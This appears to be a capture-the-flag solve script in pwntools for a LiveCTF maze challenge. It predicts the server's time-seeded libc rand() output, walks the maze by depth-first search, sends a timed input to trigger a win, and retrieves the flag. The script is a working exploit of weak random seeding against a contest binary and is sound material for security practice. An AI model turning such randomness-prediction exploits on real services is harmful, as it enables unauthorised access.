from pwn import *
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

def submit(s:remote):
    s.sendline(b'./submitter')
    flag = s.recvline_contains(b'LiveCTF{').decode().strip()
    log.info('Flag: %s', flag)

stepx = [0,0,1,-1]
stepy = [1,-1,0,0]
pathc = ['e','w','s','n']
def dfs(x,y,path):
    global maze
    # print(path,maze[x][y])
    if(maze[x][y] == ord('*')):
        print(path)
        return path
    maze[x][y] = ord('#')
    for i in range(4):
        tmpx = x + stepx[i]
        tmpy = y + stepy[i]
        if(maze[tmpx][tmpy] == ord('#')):
            continue
        p = dfs(tmpx,tmpy,path+pathc[i])
        if(p):
            return p
    maze[x][y] = ord('.')
    return None

s = remote(HOST, int(PORT))

import ctypes

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
LIBC.srand(LIBC.time(0))
for i in range(590):
  LIBC.rand()
print(hex(LIBC.rand()))


# s = process("./challenge")
s.sendlineafter(b"torment:", b"a")
s.recvuntil(b"You cast arcane eye and send your summoned magical eye above the maze.\n")
maze = s.recvuntil(b"\nYou are in room (1, 1)",drop=True)
print(maze.decode())
maze = maze.splitlines()
for i in range(len(maze)):
    maze[i] = bytearray(maze[i])
x = 1
y = 1
print(maze[1][1])
path = dfs(x,y,'')
# print(path)
for i in path[:-1]:
    # print(i)
    s.sendlineafter(b'torment',i.encode())
    LIBC.rand()

a = 0
while(1):
  tmp =  LIBC.rand()
  if(tmp % 1213) == 1212:
    break
  a = a+1

print(a)
# for i in range(a):
#     print(i)
s.sendlineafter(b'torment',b'm'*a)


s.sendlineafter(b'torment',path[-1].encode())
submit(s)

# s.interactive()